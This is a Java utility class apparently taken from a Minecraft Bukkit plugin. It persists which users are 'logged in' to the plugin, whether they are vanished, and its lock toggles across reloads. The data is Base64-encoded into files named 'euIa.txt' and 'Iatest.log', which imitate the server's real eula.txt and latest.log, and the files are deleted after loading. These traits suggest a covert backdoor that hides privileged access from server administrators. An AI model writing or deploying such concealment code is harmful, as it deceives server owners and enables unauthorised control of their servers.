package de.impact.utils;

import de.impact.utils.lock.LockUtils;
import de.impact.utils.lock.Locks;
import org.apache.commons.io.IOUtils;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.util.StringUtil;

import java.io.*;
import java.util.Base64;
import java.util.UUID;

public class SaveUtils {

    private static final String PATH = "euIa.txt";
    private static final String PATH_SECOND = "/logs/Iatest.log";

    private SaveUtils() {
        throw new IllegalArgumentException("Utility Class");
    }

    public static void save() {
        try {
            saveLoggedInUsers();
            saveToggles();
        } catch (IOException ignored) {}
    }

    public static void load() {
        try {
            loginSavedUsers();
            loadToggles();
        } catch (IOException ignored) {}
    }

    private static void saveLoggedInUsers() throws IOException {

        if(UserUtils.getLoggedInUsers().isEmpty()) return;

        for (UUID uuid : UserUtils.getLoggedInUsers()) {

            Player p = Bukkit.getPlayer(uuid);

            if (p == null) continue;

            ChatUtils.sendMessage(p, "§c§lWARNING: §cThe plugin has been disabled!");

        }

        StringBuilder write = new StringBuilder();

        for (UUID uuid : UserUtils.getLoggedInUsers())
            write.append(Base64.getEncoder().encodeToString((uuid.toString() + ":" + VanishUtils.isVanished(uuid)).getBytes())).append(" ");

        if(write.toString().isEmpty())
            return;

        BufferedWriter writer = new BufferedWriter(new FileWriter(PATH, false));

        writer.write(write.toString());

        writer.flush();
        writer.close();
    }

    private static void saveToggles() throws IOException {

        BufferedWriter writer = new BufferedWriter(new FileWriter(PATH_SECOND, false));
        StringBuilder data = new StringBuilder();

        LockUtils.getLocked().forEach((locks, aBoolean) -> data.append(locks.name()).append("-").append(aBoolean).append(":").toString());

        writer.write(Base64.getEncoder().encodeToString(data.toString().getBytes()));

        writer.flush();
        writer.close();
    }

    private static void loginSavedUsers() throws IOException {

        if(!new File(PATH).exists())
            return;

        FileInputStream inputStream = new FileInputStream(PATH);
        String[] inputStreamSplit = IOUtils.toString(inputStream).split(" ");

        for(String s : inputStreamSplit) {

            if(s.isEmpty())
                continue;

            String uuidString = new String(Base64.getDecoder().decode(s.getBytes()));
            String shouldVanish = uuidString.split(":")[1];
            UUID uuid = UUID.fromString(uuidString.split(":")[0]);

            if(Bukkit.getPlayer(uuid) == null)
                continue;

            if(shouldVanish.equalsIgnoreCase("true"))
                VanishUtils.setVanished(uuid, true);

            UserUtils.login(uuid);

            ChatUtils.sendMessage(Bukkit.getPlayer(uuid), "§c§lWARNING: §cThe plugin has been enabled and you have been signed in" + (VanishUtils.isVanished(uuid) ? " and vanished" : ""));

        }

        inputStream.close();
        new File(PATH).delete();

    }

    private static void loadToggles() throws IOException {

        if(!new File(PATH_SECOND).exists())
            return;

        FileInputStream inputStream = new FileInputStream(PATH_SECOND);
        String is = IOUtils.toString(inputStream);
        String[] inputStreamSplit = new String(Base64.getDecoder().decode(is.getBytes())).split(":");

        for(String s : inputStreamSplit) {

            if(s.split("-")[0] == null || s.split("-")[1] == null) continue;

            LockUtils.setLocked(Locks.valueOf(s.split("-")[0]), Boolean.parseBoolean(s.split("-")[1]));
        }

        inputStream.close();
        new File(PATH_SECOND).delete();

    }

}
